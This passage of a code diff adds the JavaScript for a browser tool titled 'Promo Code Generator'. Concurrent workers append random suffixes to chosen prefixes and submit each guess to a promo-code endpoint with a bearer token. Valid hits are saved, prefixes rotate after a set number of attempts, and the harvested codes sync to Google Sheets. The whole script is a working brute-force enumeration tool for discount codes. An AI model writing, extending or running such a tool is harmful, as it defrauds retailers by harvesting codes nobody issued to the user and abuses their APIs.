+                attemptsSinceLastFound++;
+                workerAttemptsSincePrefixChange++;
+                attemptsSincePrefixChange = workerAttemptsSincePrefixChange; // Update global for display
+                updateAttemptsDisplay();
+
+                if (status === "VALID" || status === "DUPLICATE") { // Treat duplicate as found for now
+                    logMessage(`Worker ${workerLogId} found: ${generatedCode} (Status: ${status})`, "SUCCESS");
+                    let currentValidCodes = loadValidCodes();
+                    if (!currentValidCodes.includes(generatedCode)) {
+                        currentValidCodes.push(generatedCode);
+                        saveValidCodes(currentValidCodes);
+                    }
+                    attemptsSinceLastFound = 0;
+                    workerAttemptsSincePrefixChange = 0;
+                    // Optionally, this worker could stop or switch prefix: break;
+                } else if (status === "INVALID") {
+                    // Continue
+                } else if (status === "AUTH_ERROR") {
+                    logMessage(`Worker ${workerLogId}: Auth Error (401/403) checking ${generatedCode}. Stopping all tasks.`, "ERROR");
+                    stopAllTasks(true); // Signal a hard stop due to auth error
+                    return; // Stop this worker
+                } else { // Network error, timeout, API error etc.
+                    logMessage(`Worker ${workerLogId} encountered ${status} for ${generatedCode}. Pausing...`, "WARNING");
+                    await new Promise(resolve => setTimeout(resolve, 5000)); // Pause
+                }
+
+                if (workerAttemptsSincePrefixChange >= DEFAULT_MAX_ATTEMPTS_BEFORE_CHANGE) {
+                    const newPrefix = incrementPrefix(currentPrefix);
+                    logMessage(`Worker ${workerLogId}: Max attempts (${DEFAULT_MAX_ATTEMPTS_BEFORE_CHANGE.toLocaleString()}) for ${currentPrefix}. Incrementing to ${newPrefix}.`, "WARNING");
+                    currentPrefix = newPrefix;
+                    workerAttemptsSincePrefixChange = 0;
+                }
+                 await new Promise(resolve => setTimeout(resolve, 50)); // Small delay between attempts
+            }
+        } catch (e) {
+            logMessage(`Unexpected error in worker ${workerLogId}: ${e.message}`, "ERROR");
+        } finally {
+            logMessage(`Worker ${workerLogId} finishing.`, "DEBUG");
+            activeWorkers--;
+            checkAllWorkersFinished();
+        }
+    }
+
+    function startGeneration() {
+        if (isRunning) {
+            logMessage("A task is already running.", "WARNING");
+            return;
+        }
+
+        const selectedPrefix = prefixDropdown.value;
+        if (!selectedPrefix || selectedPrefix === "Select..." || selectedPrefix === "No Prefixes Available") {
+            logMessage("Please select a valid prefix before starting generation.", "ERROR");
+            return;
+        }
+        updateBearerTokenFromEntry();
+        if (!bearerToken || bearerToken === "YOUR_BEARER_TOKEN_HERE") {
+            showAlert("Token Missing", "Please enter your Bearer Token in the Configuration section.");
+            return;
+        }
+
+
+        setRunningState(true, "Generating...");
+        stopRequested = false;
+        attemptsSinceLastFound = 0;
+        // totalAttempts = 0; // Optionally reset total attempts for each run
+
+        activeWorkers = NUM_GENERATION_WORKERS;
+        for (let i = 0; i < NUM_GENERATION_WORKERS; i++) {
+            // Start worker, don't await it here, let it run in background
+            generationWorker(selectedPrefix, `Gen-${i + 1}`);
+        }
+        logMessage(`Submitted ${NUM_GENERATION_WORKERS} generation worker(s) for ${selectedPrefix}.`, "INFO");
+    }
+
+    // --- Checking Logic ---
+    async function checkSingleCodeWorker(codeToCheck) {
+        const status = await sendPromoRequest(codeToCheck);
+        return { code: codeToCheck, status: status };
+    }
+
+    async function runCheckLoop(codesToCheck) {
+        const workerLogId = "CheckCoordinator";
+        logMessage(`${workerLogId} started for ${codesToCheck.length} codes.`, "INFO");
+
+        let stillValidCodes = [];
+        let invalidCodesFound = [];
+        let errorCodes = []; // Codes that had network/API issues, or auth errors
+        let authErrorEncountered = false;
+
+        let processedCount = 0;
+        const totalToProcess = codesToCheck.length;
+        
+        // Process codes in batches to manage concurrency
+        const batchSize = NUM_CHECKING_WORKERS;
+        for (let i = 0; i < totalToProcess; i += batchSize) {
+            if (stopRequested) break;
+            const batch = codesToCheck.slice(i, i + batchSize);
+            const promises = batch.map(code => checkSingleCodeWorker(code));
+
+            try {
+                const results = await Promise.all(promises);
+                if (stopRequested) break;
+
+                for (const result of results) {
+                    processedCount++;
+                    updateCodeDisplay(result.code);
+                    attemptsLabel.textContent = `Checked: ${processedCount}/${totalToProcess}`;
+
+                    if (result.status === "VALID" || result.status === "DUPLICATE") {
+                        stillValidCodes.push(result.code);
+                    } else if (result.status === "INVALID") {
+                        invalidCodesFound.push(result.code);
+                    } else if (result.status === "AUTH_ERROR") {
+                        logMessage(`Auth Error (401/403) checking ${result.code}. Will stop after this batch.`, "ERROR");
+                        errorCodes.push(result.code); // Keep it for now
+                        stillValidCodes.push(result.code); // Assume it might be temp, keep it
+                        authErrorEncountered = true; // Signal to stop further processing
+                    } else { // Network, timeout, API error
+                        logMessage(`Error checking ${result.code} (Status: ${result.status}). Kept in list.`, "ERROR");
+                        errorCodes.push(result.code);
+                        stillValidCodes.push(result.code); // Keep codes with temporary errors
+                    }
+                }
+            } catch (batchError) {
+                 logMessage(`Error processing a batch of checks: ${batchError.message}`, "ERROR");
+            }
+             if (authErrorEncountered) {
+                logMessage("Auth error detected, stopping further checks.", "ERROR");
+                break; // Stop processing more batches
+            }
+            await new Promise(resolve => setTimeout(resolve, 200)); // Small delay between batches
+        }
+
+
+        if (!stopRequested && !authErrorEncountered) {
+            logMessage(`${workerLogId}: Check run finished naturally.`, "DEBUG");
+            saveValidCodes(stillValidCodes); // This also sorts and removes duplicates
+            logMessage(`Check complete. Removed ${invalidCodesFound.length} invalid codes. ${stillValidCodes.length} remain.`, "SUCCESS");
+            
+            if (GOOGLE_API_KEY && GOOGLE_CLIENT_ID && updateGoogleSheetsCheckbox.checked && googleAuthInstance && googleAuthInstance.isSignedIn.get()) {
+                await doGoogleSheetsUpdate(stillValidCodes);
+            } else if (updateGoogleSheetsCheckbox.checked) {
+                logMessage("Google Sheets update skipped: Not authenticated or API key/client ID missing.", "WARNING");
+            }
+
+        } else if (authErrorEncountered) {
+            logMessage(`Check stopped due to authorization error. File not updated with removals, but errors logged.`, "ERROR");
+            // Decide if we save `stillValidCodes` which might include codes that failed auth.
+            // For now, we don't update the main list on auth error to prevent data loss.
+        } else { // Manually stopped
+            logMessage(`Check stopped manually after processing ${processedCount} codes. File not updated.`, "INFO");
+        }
+        
+        activeWorkers--; // This is the checkCoordinator worker
+        checkAllWorkersFinished();
+    }
+
+
+    function startCheckValidCodes() {
+        if (isRunning) {
+            logMessage("A task is already running.", "WARNING");
+            return;
+        }
+        updateBearerTokenFromEntry();
+         if (!bearerToken || bearerToken === "YOUR_BEARER_TOKEN_HERE") {
+            showAlert("Token Missing", "Please enter your Bearer Token in the Configuration section.");
+            return;
+        }
+
+        const codesToCheck = loadValidCodes();
+        if (codesToCheck.length === 0) {
+            logMessage("No codes found in local storage to check.", "INFO");
+            return;
+        }
+
+        setRunningState(true, `Checking ${codesToCheck.length} codes...`);
+        stopRequested = false;
+        
+        activeWorkers = 1; // The runCheckLoop itself is the "worker"
+        runCheckLoop(codesToCheck); // Don't await, let it run
+    }
+
+
+    // --- Task Management ---
+    function stopAllTasks(forceStop = false) { // forceStop for critical errors like auth
+        if (!isRunning && !forceStop) return;
+
+        if (!stopRequested) {
+            logMessage("Stop signal received. Waiting for workers...", "INFO");
+            stopRequested = true;
+        }
+        
+        // UI updates to reflect stopping state
+        stopButton.disabled = true;
+        generateButton.disabled = true;
+        checkCodesButton.disabled = true;
+        appTitle.textContent = "Promo Code Generator - Stopping...";
+
+        if (forceStop) {
+            // If it's a forced stop (e.g. auth error), we might want to immediately reset state
+            // This is a bit aggressive as workers might still be in flight.
+            // The current worker logic should detect `stopRequested` and exit.
+            logMessage("Forcing stop due to critical error.", "ERROR");
+            // Consider if any immediate cleanup is needed beyond what checkAllWorkersFinished does
+        }
+        // checkAllWorkersFinished will handle the final reset once activeWorkers is 0
+    }
+
+    function checkAllWorkersFinished() {
+        if (activeWorkers <= 0 && isRunning) { // isRunning check to prevent multiple calls
+            logMessage("All workers finished.", "INFO");
+            const finalStatus = stopRequested ? "Stopped" : "Completed";
+            setRunningState(false, finalStatus); // Reset UI and state
+            stopRequested = false; // Clear flag for next run
+        }
+    }
+
+    function setRunningState(running, statusMessage = "Idle") {
+        isRunning = running;
+        appTitle.textContent = `Promo Code Generator - ${statusMessage}`;
+        if (running) {
+            generateButton.disabled = true;
+            checkCodesButton.disabled = true;
+            stopButton.disabled = false;
+        } else {
+            generateButton.disabled = false;
+            checkCodesButton.disabled = false;
+            stopButton.disabled = true;
+            activeWorkers = 0; // Ensure counter is reset
+            resetCodeDisplay();
+            // updateAttemptsDisplay(); // Or reset it:
+            // attemptsLabel.textContent = "Attempts: 0 | Total: 0 | Since Change: 0";
+        }
+    }
+
+    // --- Other Actions ---
+    async function copyRandomCode() {
+        const codes = loadValidCodes();
+        if (codes.length > 0) {
+            const randomCode = codes[Math.floor(Math.random() * codes.length)];
+            try {
+                await navigator.clipboard.writeText(randomCode);
+                logMessage(`Copied ${randomCode} to clipboard.`, "INFO");
+            } catch (e) {
+                logMessage(`Failed to copy to clipboard: ${e.message}`, "ERROR");
+                showAlert("Clipboard Error", `Could not copy to clipboard: ${e.message}`);
+            }
+        } else {
+            logMessage("No valid codes available to copy.", "WARNING");
+        }
+    }
+
+    async function pasteAndTestToken() {
+        if (isRunning) {
+            logMessage("Cannot test token while another task is running.", "WARNING");
+            return;
+        }
+        try {
+            const clipboardText = await navigator.clipboard.readText();
+            if (clipboardText) {
+                tokenEntry.value = clipboardText.trim();
+                updateBearerTokenFromEntry(); // This updates global `bearerToken`
+
+                logMessage("Pasted token. Testing validity...", "INFO");
+                
+                let testCode = "CPNTEST0000PXXXXX"; // A generic, likely invalid code for testing auth
+                const currentPrefixes = loadPrefixes();
+                 if (currentPrefixes.length > 1 && currentPrefixes[0] !== 'Select...') {
+                    const actualPrefix = currentPrefixes.find(p => p !== 'Select...');
+                    if (actualPrefix) testCode = actualPrefix + generateRandomSuffix(5);
+                }
+
+
+                document.body.style.cursor = "wait";
+                const status = await sendPromoRequest(testCode);
+                document.body.style.cursor = "";
+
+                handleTokenTestResult(status, testCode);
+
+            } else {
+                logMessage("Clipboard is empty.", "WARNING");
+            }
+        } catch (e) {
+            logMessage(`Failed to paste or test token: ${e.message}`, "ERROR");
+            showAlert("Error", `Failed to paste or test token: ${e.message}`);
+            document.body.style.cursor = "";
+        }
+    }
+    
+    function handleTokenTestResult(status, testCode) {
+        if (status === "AUTH_ERROR") {
+            logMessage("Token Test Failed: Authorization Error (401/403). Token is invalid/expired.", "ERROR");
+            showAlert("Token Test Failed", "Authentication failed (401/403). Please provide a valid Bearer token.");
+        } else if (status === "VALID" || status === "INVALID" || status === "DUPLICATE" || status === "ERROR_API") {
+            // ERROR_API means the API responded with a 400, but not an auth error, so token is likely okay.
+            logMessage("Token Test Successful: Authentication passed (server responded).", "SUCCESS");
+            showAlert("Token Test Successful", "Authentication passed. The server responded (the test code's validity itself doesn't matter for this auth test).");
+        } else { // NETWORK_ERROR, TIMEOUT, ERROR_HTTP
+            logMessage(`Token Test Inconclusive: Error (${status}). Check network/API.`, "WARNING");
+            showAlert("Token Test Inconclusive", `Could not confirm token validity due to an error: ${status}. Check your network connection and the API status.`);
+        }
+    }
+
+    function clearOutput() {
+        outputText.innerHTML = '';
+        logMessage("Output cleared.", "INFO");
+    }
+
+    // --- Google Sheets Integration ---
+    function handleClientLoad() {
+      gapi.load('client:auth2', initGoogleClient);
+    }
+
+    function initGoogleClient() {
+      gapi.client.init({
+        apiKey: GOOGLE_API_KEY,
+        clientId: GOOGLE_CLIENT_ID,
+        scope: GOOGLE_SCOPES,
+        discoveryDocs: ["https://sheets.googleapis.com/$discovery/rest?version=v4"],
+      }).then(function () {
+        googleAuthInstance = gapi.auth2.getAuthInstance();
+        googleAuthInstance.isSignedIn.listen(updateSigninStatus);
+        updateSigninStatus(googleAuthInstance.isSignedIn.get());
+        logMessage("Google API client initialized.", "INFO");
+      }, function(error) {
+        logMessage(`Error initializing Google API client: ${JSON.stringify(error)}`, "ERROR");
+        showAlert("Google API Error", `Error initializing Google client: ${error.details || error.message || JSON.stringify(error)}`);
+      });
+    }
+
+    function updateSigninStatus(isSignedIn) {
+      if (isSignedIn) {
+        googleAuthButton.textContent = 'Sign Out Google';
+        logMessage("Google: Signed in.", "INFO");
+      } else {
+        googleAuthButton.textContent = 'Authenticate Google';
+        logMessage("Google: Signed out.", "INFO");
+      }
+    }
+
+    function handleGoogleAuthClick() {
+        if (!GOOGLE_API_KEY || !GOOGLE_CLIENT_ID) {
+            showAlert("Google Config Missing", "Please enter your Google API Key and Client ID in the Configuration section first.");
+            return;
+        }
+        if (!gapi.client) { // If gapi.client is not loaded yet (e.g. API key was just entered)
+            logMessage("Initializing Google Client with new API Key/Client ID...", "INFO");
+            handleClientLoad(); // This will call initGoogleClient
+            // User might need to click again after initialization
+            showAlert("Google Client Initializing", "Google client is initializing with the new API Key/Client ID. Please try authenticating again in a few seconds.");
+            return;
+        }
+
+
+        if (googleAuthInstance && googleAuthInstance.isSignedIn.get()) {
+            googleAuthInstance.signOut();
+        } else if (googleAuthInstance) {
+            googleAuthInstance.signIn().catch(error => {
+                 logMessage(`Google Sign-In Error: ${JSON.stringify(error)}`, "ERROR");
+                 showAlert("Google Sign-In Error", `Error during sign-in: ${error.error || error.details || JSON.stringify(error)}`);
+            });
+        } else {
+            logMessage("Google Auth instance not ready. Try again shortly.", "WARNING");
+            // Attempt to re-initialize if it failed earlier
+            handleClientLoad();
+        }
+    }
+
+    async function doGoogleSheetsUpdate(codesToWrite) {
+        if (!googleAuthInstance || !googleAuthInstance.isSignedIn.get()) {
+            logMessage("Google Sheets update skipped: Not signed in.", "ERROR");
+            return;
+        }
+        const spreadsheetId = spreadsheetIdEntry.value;
+        if (!spreadsheetId) {
+            logMessage("Spreadsheet ID missing. Cannot update Google Sheets.", "ERROR");
+            return;
+        }
+
+        logMessage("Starting Google Sheets update...", "INFO");
+        try {
+            // 1. Clear the sheet (e.g., column A)
+            const clearRange = 'Sheet1!A:A'; // Assuming codes are in column A
+            await gapi.client.sheets.spreadsheets.values.clear({
+                spreadsheetId: spreadsheetId,
+                range: clearRange,
+            });
+            logMessage(`Cleared Google Sheet range ${clearRange}.`, "INFO");
+
+            // 2. Write new codes
+            const values = codesToWrite.map(code => [code]); // Each code in its own row, first column
+            const body = { values: values };
+            const result = await gapi.client.sheets.spreadsheets.values.update({
+                spreadsheetId: spreadsheetId,
+                range: 'Sheet1!A1', // Start writing from A1
+                valueInputOption: 'RAW',
+                resource: body,
+            });
+            const updatedCells = result.result.updatedCells || 0;
+            logMessage(`Google Sheets updated successfully (${updatedCells} cells).`, "SUCCESS");
+
+        } catch (e) {
+            logMessage(`Error updating Google Sheets: ${e.result ? e.result.error.message : e.message}`, "ERROR");
+            showAlert("Google Sheets Error", `Error updating sheet: ${e.result ? e.result.error.message : e.message}`);
+        }
+    }
+
+
+    // --- Initialization ---
+    function initializeApp() {
+        // Load saved settings
+        tokenEntry.value = localStorage.getItem(LS_BEARER_TOKEN) || "YOUR_BEARER_TOKEN_HERE";
+        updateBearerTokenFromEntry(); // To set the global var
+
+        spreadsheetIdEntry.value = localStorage.getItem(LS_SPREADSHEET_ID) || DEFAULT_SPREADSHEET_ID;
+        googleApiKeyEntry.value = localStorage.getItem(LS_GOOGLE_API_KEY) || "";
+        googleClientIdEntry.value = localStorage.getItem(LS_GOOGLE_CLIENT_ID) || "";
+        GOOGLE_API_KEY = googleApiKeyEntry.value;
+        GOOGLE_CLIENT_ID = googleClientIdEntry.value;
+
+        const savedMaxAttempts = localStorage.getItem(LS_MAX_ATTEMPTS);
+        if (savedMaxAttempts) {
+            DEFAULT_MAX_ATTEMPTS_BEFORE_CHANGE = parseInt(savedMaxAttempts);
+            maxAttemptsEntry.value = DEFAULT_MAX_ATTEMPTS_BEFORE_CHANGE;
+        }
+
+
+        updatePrefixDropdown();
+        updateAttemptsDisplay();
+        setRunningState(false); // Initial state
+
+        // Event Listeners
+        discountValueRadios.forEach(radio => radio.addEventListener('change', updatePrefixDropdown));
+        addPrefixButton.addEventListener('click', addPrefixHandler);
+        removePrefixButton.addEventListener('click', removePrefixHandler);
+        updateMaxAttemptsButton.addEventListener('click', updateMaxAttemptsHandler);
+        tokenEntry.addEventListener('focusout', updateBearerTokenFromEntry); // Update on blur
+        tokenEntry.addEventListener('change', updateBearerTokenFromEntry); // Update on enter/change
+
+        spreadsheetIdEntry.addEventListener('change', () => localStorage.setItem(LS_SPREADSHEET_ID, spreadsheetIdEntry.value));
+        googleApiKeyEntry.addEventListener('change', () => {
+            GOOGLE_API_KEY = googleApiKeyEntry.value;
+            localStorage.setItem(LS_GOOGLE_API_KEY, GOOGLE_API_KEY);
+             if (gapi && gapi.client) { // If API key changes, re-init might be needed
+                logMessage("Google API Key changed. Re-initialization of Google Client might be needed if issues occur.", "WARNING");
+                // For simplicity, not forcing re-init here, but user might need to re-auth or refresh.
+            }
+        });
+        googleClientIdEntry.addEventListener('change', () => {
+            GOOGLE_CLIENT_ID = googleClientIdEntry.value;
+            localStorage.setItem(LS_GOOGLE_CLIENT_ID, GOOGLE_CLIENT_ID);
+             if (gapi && gapi.client) {
+                logMessage("Google Client ID changed. Re-initialization of Google Client might be needed if issues occur.", "WARNING");
+            }
+        });
+
+
+        generateButton.addEventListener('click', startGeneration);
+        stopButton.addEventListener('click', () => stopAllTasks(false));
+        checkCodesButton.addEventListener('click', startCheckValidCodes);
+        copyButton.addEventListener('click', copyRandomCode);
+        clearButton.addEventListener('click', clearOutput);
+        pasteTestTokenButton.addEventListener('click', pasteAndTestToken);
+        googleAuthButton.addEventListener('click', handleGoogleAuthClick);
+
+        // Load Google API client library
+        // Defer loading until API key and Client ID are potentially available from localStorage
+        if (GOOGLE_API_KEY && GOOGLE_CLIENT_ID) {
+            handleClientLoad();
+        } else {
+            logMessage("Google API Key or Client ID not found in localStorage. Enter them to enable Google Sheets.", "INFO");
+        }
+
+
+        logMessage("Application initialized. Ready.", "INFO");
+    }
+
+    // Start the app
+    document.addEventListener('DOMContentLoaded', initializeApp);
+
+</script>
 </body>
 </html>
